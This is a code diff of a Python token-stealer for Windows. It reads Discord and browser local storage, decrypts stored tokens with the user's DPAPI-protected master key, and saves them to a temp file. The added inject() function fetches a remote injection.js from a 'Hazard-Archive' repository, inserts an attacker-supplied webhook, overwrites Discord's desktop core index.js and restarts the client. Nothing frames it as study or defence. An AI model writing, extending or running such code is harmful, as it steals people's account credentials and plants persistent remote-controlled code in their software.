@@ -4,11 +4,16 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from json import loads
 from base64 import b64decode
+import sys
+import requests
+import re
+
 global all_tokens
 all_tokens = []
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
+
 paths = {
     'Discord': local + '\\discord\\Local Storage\\leveldb\\',
     'Discord Canary': local + '\\discordcanary\\Local Storage\\leveldb\\',
@@ -33,8 +38,10 @@ paths = {
     'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
     'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
 }
+
 path2 = roaming + '\\discord\\Local Storage\\leveldb\\'
 path3 = roaming + '\\discord\\'
+
 def gettokens(paths):
     tokens = []
     for file_name in os.listdir(paths):
@@ -45,11 +52,14 @@ def gettokens(paths):
                 for token in findall(regex, line):
                     all_tokens.append(token)
     return tokens
+
 def get_master_key(path3):
     with open(f'{path3}Local State', 'r', encoding='utf-8') as f:
         key = loads(f.read())['os_crypt']['encrypted_key']
         return key
+
 penis = get_master_key(path3)
+
 def get_discord_token(path2):
     tokens_discord = []
     for subdir, dirs, files in os.walk(path2):
@@ -70,11 +80,24 @@ def get_discord_token(path2):
                     pass
     for token in tokens_discord:
         all_tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(penis)[5:]))
+
 def decrypt(buff, master_key):
     try:
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except Exception as e:
         return "An error has occured.\n" + e
+
+def inject():
+    for _dir in os.listdir(os.getenv('localappdata')):
+        if 'discord' in _dir.lower():
+            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
+                if re.match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
+                    f = requests.get("https://raw.githubusercontent.com/dekrypted/Hazard-Archive/main/Injection/injection.js").text.replace("%WEBHOOK%", inject_url)
+                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                        indexFile.write(f)
+                    os.startfile(abspath+os.sep+_dir+'.exe')
+
 if __name__ == '__main__':
     for platfrom, path in paths.items():
         if not os.path.exists(path):
@@ -85,3 +108,5 @@ if __name__ == '__main__':
     with open(f"{temp}\\tokens.txt", "w", encoding="utf-8", errors="ignore") as f:
         for shits in remove_dup:
             f.write(shits + "\n")
+    inject_url = sys.argv[1]
+    inject()
